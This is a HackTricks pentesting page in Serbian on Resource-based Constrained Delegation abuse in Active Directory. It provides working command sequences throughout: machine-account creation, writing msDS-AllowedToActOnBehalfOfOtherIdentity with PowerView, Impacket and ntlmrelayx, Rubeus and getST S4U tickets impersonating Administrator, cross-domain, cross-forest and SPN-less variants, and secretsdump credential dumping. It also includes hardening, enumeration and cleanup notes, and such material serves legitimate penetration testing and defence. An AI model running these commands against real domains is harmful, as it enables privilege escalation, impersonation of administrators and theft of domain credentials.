# Resource-based Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}


## Osnove Resource-based Constrained Delegation

Ovo je slično osnovnom [Constrained Delegation](constrained-delegation.md), ali **umesto** davanja dozvola **objektu** da **impersonate-uje bilo kog korisnika prema mašini**, Resource-based Constrain Delegation **podešava** u **objektu ko može da impersonate-uje bilo kog korisnika prema njemu**.

U ovom slučaju, constrained objekat će imati atribut pod nazivom _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ sa imenom korisnika koji može da impersonate-uje bilo kog drugog korisnika prema njemu.

Još jedna važna razlika između ovog Constrained Delegation i ostalih delegacija jeste to što svaki korisnik sa **write dozvolama nad machine account-om** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) može da podesi **_msDS-AllowedToActOnBehalfOfOtherIdentity_** (kod drugih oblika Delegation bile su potrebne domain admin privilegije).

### Novi koncepti

Kod Constrained Delegation je navedeno da je **`TrustedToAuthForDelegation`** flag unutar _userAccountControl_ vrednosti korisnika potreban za izvršavanje **S4U2Self.** Međutim, to nije potpuno tačno.\
U stvarnosti, čak i bez te vrednosti, možete izvršiti **S4U2Self** prema bilo kom korisniku ako ste **service** (imate SPN), ali ako **imate `TrustedToAuthForDelegation`**, vraćeni TGS će biti **Forwardable**, a ako nemate taj flag, vraćeni TGS **neće** biti **Forwardable**.

Međutim, ako TGS korišćen u **S4U2Proxy** **NIJE Forwardable**, pokušaj zloupotrebe osnovnog Constrain Delegation **neće funkcionisati**. Ali ako pokušavate da iskoristite Resource-Based constrain delegation, funkcionisaće.

### Struktura napada

> Ako imate **write equivalent privilegije** nad **Computer** account-om, možete dobiti **privileged access** na toj mašini.

Pretpostavimo da napadač već ima **write equivalent privilegije nad victim computer-om**.

1. Napadač kompromituje account koji ima **SPN** ili ga **kreira** („Service A“). Imajte na umu da bilo koji _Admin User_ bez drugih posebnih privilegija može da **kreira do 10 Computer objekata** (**_MachineAccountQuota_**) i da im podesi **SPN**. Dakle, napadač može jednostavno da kreira Computer objekat i podesi SPN.
2. Napadač **zloupotrebljava svoju WRITE privilegiju** nad victim computer-om (ServiceB) da konfiguriše **resource-based constrained delegation kako bi omogućio ServiceA-u da impersonate-uje bilo kog korisnika** prema tom victim computer-u (ServiceB).
3. Napadač koristi Rubeus za izvršavanje **potpunog S4U napada** (S4U2Self i S4U2Proxy) od Service A do Service B za korisnika **sa privileged access-om na Service B**.
1. S4U2Self (sa kompromitovanog/kreiranog account-a sa SPN-om): Zatražiti **TGS od Administrator-a ka meni** (nije Forwardable).
2. S4U2Proxy: Iskoristiti **ne-Forwardable TGS** iz prethodnog koraka za zahtev za **TGS od** korisnika **Administrator** ka **victim host-u**.
3. Čak i ako koristite ne-Forwardable TGS, pošto iskorišćavate Resource-based constrained delegation, funkcionisaće.
4. Napadač može da uradi **pass-the-ticket** i **impersonate-uje** korisnika kako bi dobio **pristup victim ServiceB-u**.

Da biste proverili _**MachineAccountQuota**_ domena, možete koristiti:
```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Napad

### Kreiranje objekta računara

Možete kreirati objekat računara unutar domena koristeći **[powermad](https://github.com/Kevin-Robertson/Powermad):**
```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Podešavanje Resource-based Constrained Delegation

**Korišćenje activedirectory PowerShell modula**
```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Korišćenje PowerView-a**
```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Izvođenje potpunog S4U napada (Windows/Rubeus)

Pre svega, kreirali smo novi Computer objekat sa lozinkom `123456`, pa nam je potreban hash te lozinke:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Ovo će ispisati RC4 i AES hash vrednosti za taj nalog.\
Sada napad može da se izvrši:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Možete generisati više ticket-a za više servisa samo jednim zahtevom koristeći parametar `/altservice` alata Rubeus:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
> [!CAUTION]
> Imajte na umu da korisnici imaju atribut pod nazivom "**Cannot be delegated**". Ako je ovaj atribut kod korisnika postavljen na True, nećete moći da se impersonate-ujete kao on. Ovo svojstvo se može videti unutar BloodHound-a.

### Linux tooling: end-to-end RBCD with Impacket (2024+)

Ako radite iz Linux-a, možete izvršiti čitav RBCD chain koristeći zvanične Impacket alate:
```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```
Beleške
- Ako je LDAP signing/LDAPS enforced, koristite `impacket-rbcd -use-ldaps ...`.
- Preferirajte AES ključeve; mnogi moderni domeni ograničavaju RC4. Impacket i Rubeus podržavaju tokove koji koriste samo AES.
- Impacket može da prepiše `sname` ("AnySPN") za neke alate, ali kad god je moguće pribavite ispravan SPN (npr. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

## RBCD između domena i između forest-a

Ako se **delegating principal** koji kontrolišete nalazi u **drugom domenu** (ili čak u **drugom forest-u**) u odnosu na **resource computer**, zloupotreba je i dalje **RBCD**, ali tok ticket-a više nije uobičajeni `S4U2Self -> S4U2Proxy` u okviru jednog domena.

### RBCD između domena: konfigurisanje foreign principal-a pomoću SID-a

Kada podesite `msDS-AllowedToActOnBehalfOfOtherIdentity` iz **drugog domena**, strani machine/user možda **neće moći da se razreši po imenu** u LDAP-u ciljnog domena. U tom slučaju, konfigurišite delegation entry pomoću **SID-a** stranog principal-a umesto njegovog sAMAccountName/UPN-a.

Ovo je naročito relevantno kada prosleđujete NTLM ka LDAP-u pomoću `ntlmrelayx.py`:
```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
--no-dump --no-da --no-validate-privs \
--delegate-access \
--escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
--sid
```
Napomene:
- `--sid` govori alatu `ntlmrelayx.py` da `--escalate-user` tretira kao SID, što je potrebno kada je delegirajući nalog iz drugog domena u odnosu na ciljni domen.
- Čak i ako alat ispiše `User not found in LDAP`, upis delegacije i dalje može uspeti jer security descriptor direktno skladišti strani SID.

### Cross-domain RBCD: cross-realm S4U sekvenca

Kada se strani principal nađe u `msDS-AllowedToActOnBehalfOfOtherIdentity`, funkcionalni cross-domain tok je:

1. Dobijanje **TGT**-a za delegirajući principal iz njegovog domena.
2. Zahtev za **referral TGT** za `krbtgt/<target-domain>`.
3. Zahtev za **cross-realm S4U2Self referral** za impersonated user na DC-u ciljnog domena.
4. Zahtev za stvarni **S4U2Self** ticket za tog korisnika nazad u delegator domenu.
5. Izvršavanje **S4U2Proxy** u delegator domenu radi dobijanja referral ticketa za ciljni domen.
6. Izvršavanje završnog **S4U2Proxy** na DC-u ciljnog domena radi dobijanja service ticketa za `cifs/host.target`, `host/host.target` itd.

Zbog toga standardni Linux alati često ne uspevaju kod cross-domain RBCD:
- **realm** zahteva možda mora da se razlikuje od realm-a TGT-a korišćenog u `TGS-REQ` zahtevu
- lanac zahteva **nezavisne S4U2Proxy korake**, a ne samo `S4U2Self` ili `S4U2Self` neposredno praćen jednim `S4U2Proxy` korakom

### Cross-domain RBCD iz Linux-a

Synacktiv je objavio Impacket `getST.py` implementaciju koja reprodukuje cross-realm sekvencu iz Linux-a eksplicitnim upravljanjem sa dva KDC-a:
```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
-dc-ip 192.168.90.131 \
-targetdc 192.168.90.217 \
-targetdomain asgard.local \
-impersonate thor_adm \
-spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
-k -no-pass -dc-ip 192.168.90.217
```
U praksi, novi argumenti su:
- `-dc-ip`: DC **delegirajućeg** domena
- `-targetdomain`: domen **resource computer-a**
- `-targetdc`: DC **resource** domena

### Ograničenja Cross-forest RBCD-a

Cross-forest RBCD ima važno ograničenje: **impersonated user mora pripadati istoj šumi kao delegirajući principal**. Drugim rečima, ako je vaš kontrolisani machine account u `valhalla.local`, a ciljni resource je u `asgard.local`, generalno **ne možete impersonate-ovati proizvoljne `asgard.local` korisnike** prema tom resource-u putem RBCD-a.

I dalje je exploitable kada:
- je korisnik iz **delegirajuće šume** **local admin** (ili na drugi način privileged) na resource hostu u drugoj šumi
- trust omogućava neophodan authentication path i strani SID je prihvaćen u security descriptor-u ciljnog computer-a

### Quirks Cross-forest RBCD protokola

Cross-forest RBCD nije samo "cross-domain plus trust". Posmatrani flow uključuje dva quirks-a koje uobičajeni alati istorijski propuštaju:

1. Dodatni **S4U2Proxy** request koji postavlja **`PA-PAC-OPTIONS=branch-aware`**
2. Finalni service ticket koji može biti vraćen korišćenjem **RC4**, čak i kada su zatraženi drugi etypes

Praktičan flow je:

1. Dobijte TGT za delegirajući principal u forest A.
2. Zatražite **S4U2Self** za impersonated user-a u forest A.
3. Zatražite **S4U2Proxy** u forest A da biste dobili referral TGT za forest B.
4. Pošaljite drugi **S4U2Proxy** u forest A **bez S4U2Self ticket-a kao additional ticket-a**, ali sa omogućenim `branch-aware`, da biste dobili drugi referral TGT za forest B.
5. Opciono zatražite normalan service ticket u forest B za delegirajući principal (ovaj ticket nije potreban za finalni abuse).
6. Iskoristite referral ticket-e iz koraka 3 i 4 da zatražite finalni **S4U2Proxy** ticket u forest B za impersonated forest-A user-a prema ciljnom SPN-u.

### Cross-forest RBCD sa Linux-a

Ista Synacktiv Impacket grana dodaje `-forest` switch za ovu logiku:
```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
-impersonate 'v_thor' \
-dc-ip VALHALLA.local \
valhalla.local/'desktop$' \
-targetdc ASGARD.local \
-targetdomain asgard.local \
-aesKey 4[...]f \
-forest
```
### Rekurzivni multi-domain RBCD (3+ domena)

U **multi-domain forestima**, i **S4U2Self** i **S4U2Proxy** mogu biti **rekurzivni**, umesto da se zaustave nakon jednog referral-a:

- **Rekurzivni S4U2Self**: prvi `S4U2Self` se šalje u **domen impersonated korisnika**, međukoraci parent/child domena prolaze se pomoću normalnih `TGS-REQ` referral-a za `krbtgt/<REALM>`, a **finalni `S4U2Self`** se šalje u **sopstveni domen delegating principal-a**.
- To znači da **samo posedovanje TGT-a** za machine account može biti dovoljno za impersonaciju **admin-a iz drugog domena u istom forestu** i zahtev za `cifs/host`, `host/host`, `wsman/host` itd.
- **Rekurzivni S4U2Proxy** prati trust chain na isti način: međukoraci ponovo koriste prethodni ticket kao TGT pri zahtevanju sledećeg `krbtgt/<REALM>` referral-a, a samo poslednji korak vraća finalni service ticket.

Praktičan same-forest primer je:
```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
-impersonate Administrator@frperso.local -self \
-altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```
### SPN-less cross-domain / cross-forest RBCD

Ako je **delegating principal user bez SPN-a**, poslednji rekurzivni `S4U2Self` ne uspeva sa greškom **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**. Rešenje je da se **samo poslednji hop ponovi kao `S4U2Self+U2U`**.

Kratka verzija abuse chain-a:

1. Authenticate koristeći **NT hash**, kako bi KDC bio usmeren ka **RC4-HMAC (etype 23)**.
2. Prvo zatražite **`-self -u2u`** i sačuvajte taj ticket odvojeno od kasnijeg proxy koraka.
3. Izvucite **TGT session key** pomoću `describeTicket.py`.
4. Zamenite korisnikov **NT hash** tim **session key-em** koristeći `changepasswd.py -newhashes <session_key>`.
5. Ponovo upotrebite `S4U2Self+U2U` ticket kao **`-additional-ticket`** tokom zasebnog **`-proxy`** zahteva.
```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
-impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
-hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
-impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
-spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```
Operativne napomene:

- Kada je **prvi trusted hop već druga forest**, preferirajte **branch-aware** algoritam (`getST.py ... -forest`) kako bi se podudaralo sa izvornim ponašanjem Windows-a. Ako se do foreign forest dolazi tek kasnije u lancu, non-branch-aware rekurzivni tok i dalje može raditi.
- Na novijim **Windows Server 2022/2025** DC-ovima, forsirani RC4 može da ne uspe sa **`KDC_ERR_ETYPE_NOSUPP`** zbog deprecated RC4-a; zbog toga **SPN-less RBCD** može biti nemoguć, iako klasični SPN-backed RBCD i dalje radi sa AES-om.
- Pokrenite **`S4U2Self+U2U` pre promene hash-a/lozinke korisnika**: **`SamrChangePasswordUser`** ne preračunava Kerberos AES ključeve naloga, pa promena lozinke unapred može pokvariti kasnije zahteve za ticket.
- Nalog za impersonation i dalje mora biti delegable: **Protected Users** i nalozi sa **`NOT_DELEGATED`** / **"Account is sensitive and cannot be delegated"** blokiraju lanac.

## Napomene o detekciji / hardening-u

- RBCD putanje između domena/forest-a i dalje se obično kreiraju putem **ACL abuse-a** ili **relay-to-LDAP** napada. Uključite **LDAP signing** i **LDAP channel binding** na DC-ovima kako biste prekinuli uobičajene putanje za postavljanje.
- Audituјte ko može da upisuje `msDS-AllowedToActOnBehalfOfOtherIdentity` na computer objektima i razrešite sačuvane SID-ove, uključujući **foreign security principals**.
- U okruženjima sa mnogo trust-ova proverite **Selective Authentication**, **SID filtering** i da li korisnici iz foreign forest-a imaju prava **local admin** na resource hostovima.

### Pristupanje

Poslednja komandna linija izvršiće **kompletan S4U napad i ubaciti TGS** od Administratora do victim host-a u **memoriju**.\
U ovom primeru zatražen je TGS za servis **CIFS** od Administratora, tako da ćete moći da pristupite **C$**:
```bash
ls \\victim.domain.local\C$
```
### Zloupotreba različitih service tickets

Saznajte više o [**dostupnim service tickets ovde**](silver-ticket.md#available-services).

## Nabrajanje, provera i čišćenje

### Nabrojte računare na kojima je RBCD konfigurisan

PowerShell (dekodiranje SD-a radi razrešavanja SID-ova):
```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
ForEach-Object {
$raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
$sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
$sd.DiscretionaryAcl | ForEach-Object {
$sid  = $_.SecurityIdentifier
try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
[PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
}
}
```
Impacket (čitanje ili pražnjenje jednom komandom):
```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```
### Čišćenje / resetovanje RBCD

- PowerShell (brisanje atributa):
```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```
- Impacket:
```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```
## Kerberos greške

- **`KDC_ERR_ETYPE_NOTSUPP`**: Ovo znači da je kerberos konfigurisan tako da ne koristi DES ili RC4, a vi prosleđujete samo RC4 hash. Prosledite Rubeus-u najmanje AES256 hash (ili mu prosledite rc4, aes128 i aes256 hash-eve). Primer: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** tokom `-self` za običnog korisnika: delegirajući principal verovatno **nema SPN**. Ponovite **poslednji hop** kao **`S4U2Self+U2U`** umesto standardnog **`S4U2Self`**.
- **`KDC_ERR_ETYPE_NOSUPP`** tokom **SPN-less RBCD**: noviji DC-ovi mogu odbiti forsirani **RC4-HMAC** path koji zahteva trik **`S4U2Self+U2U`** + zamenu session key-a. Umesto toga probajte klasičan **SPN-backed** RBCD path sa AES-om.
- **`KRB_AP_ERR_SKEW`**: Ovo znači da se vreme na trenutnom računaru razlikuje od vremena na DC-u i da kerberos ne radi ispravno.
- **`preauth_failed`**: Ovo znači da dati username + hash-evi ne rade za login. Možda ste zaboravili da stavite znak "$" u username prilikom generisanja hash-eva (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`**: Ovo može značiti:
- Korisnik kog pokušavate da impersonate-ujete ne može da pristupi željenom servisu (zato što ne možete da ga impersonate-ujete ili zato što nema dovoljno privilegija)
- Traženi servis ne postoji (ako tražite ticket za winrm, ali winrm nije pokrenut)
- Kreirani fakecomputer je izgubio privilegije nad ranjivim serverom i morate mu ih ponovo dodeliti.
- Zloupotrebljavate klasičan KCD; imajte na umu da RBCD radi sa non-forwardable S4U2Self ticket-ima, dok KCD zahteva forwardable ticket-e.

## Napomene, relay-i i alternative

- RBCD SD možete upisati i preko AD Web Services (ADWS) ako je LDAP filtriran. Pogledajte:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos relay lanci se često završavaju u RBCD-u kako bi se u jednom koraku postigao lokalni SYSTEM. Pogledajte praktične end-to-end primere:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

- Ako su LDAP signing/channel binding **isključeni** i možete da kreirate machine account, alati kao što je **KrbRelayUp** mogu da relay-uju prisiljeni Kerberos auth ka LDAP-u, postave `msDS-AllowedToActOnBehalfOfOtherIdentity` za vaš machine account na target computer objektu i odmah impersonate-uju **Administrator** putem S4U-a sa off-host računara.

## Reference

- [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
- [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
- [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)
- [https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61](https://posts.specterops.io/kerberosity-killed-the-domain-an-offensive-kerberos-overview-eb04b1402c61)
- Impacket rbcd.py (official): https://github.com/fortra/impacket/blob/master/examples/rbcd.py
- Quick Linux cheatsheet with recent syntax: https://tldrbins.github.io/rbcd/
- [0xdf – HTB Bruno (LDAP signing off → Kerberos relay to RBCD)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd.html)
- [Synacktiv - Exploring cross-domain & cross-forest RBCD: part 2](https://www.synacktiv.com/en/publications/exploring-cross-domain-cross-forest-rbcd-part-2.html)
- [Synacktiv Impacket branch - cross_forest_rbcd](https://github.com/synacktiv/impacket/tree/cross_forest_rbcd)
- [Microsoft Learn - Kerberos constrained delegation overview](https://learn.microsoft.com/en-us/windows-server/security/kerberos/kerberos-constrained-delegation-overview)
- [Microsoft Open Specifications - Cross-domain S4U2Self](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/f35b6902-6f5e-4cd0-be64-c50bbaaf54a5)
- [Microsoft Open Specifications - SamrChangePasswordUser](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-samr/9699d8ca-e1a4-433c-a8c3-d7bebeb01476)
- [Microsoft Learn - Detect and remediate RC4 usage in Kerberos](https://learn.microsoft.com/en-us/windows-server/security/kerberos/detect-remediate-rc4-kerberos)


{{#include ../../banners/hacktricks-training.md}}
